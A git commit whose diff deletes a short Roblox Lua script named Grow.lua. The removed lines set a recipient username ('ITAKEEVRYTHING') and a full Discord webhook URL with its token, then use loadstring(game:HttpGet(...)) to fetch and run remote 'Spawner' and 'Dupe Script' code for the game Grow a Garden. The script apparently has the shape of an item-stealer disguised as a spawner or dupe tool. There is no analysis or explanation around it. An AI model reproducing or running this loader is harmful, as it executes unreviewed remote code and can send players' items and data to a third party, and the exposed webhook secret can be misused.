d96c9bf3e28dc8481dbfa922909b7d1ca4a67815
whoiscult <whoiscult@gmail.com>
2025-08-06 03:10:43 +1000

    Delete Grow.lua

--- Grow.lua
+++
@@ -1,6 +0,0 @@
-Username = "ITAKEEVRYTHING"
-Username2 = "ITAKEEVRYTHING"
-Webhook = "https://discord.com/api/webhooks/1401212049077309500/NwVs5Lre8fk2SQfnzpSResFWRxWsZ5ISnDiJhWAu4KkQCwAwDypPrFy-A1QkqIRF62St"
-
-loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()Spawner.Load()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/whoiscult/Kwarns-Dupe-Script/refs/heads/main/Grow.lua", true))()
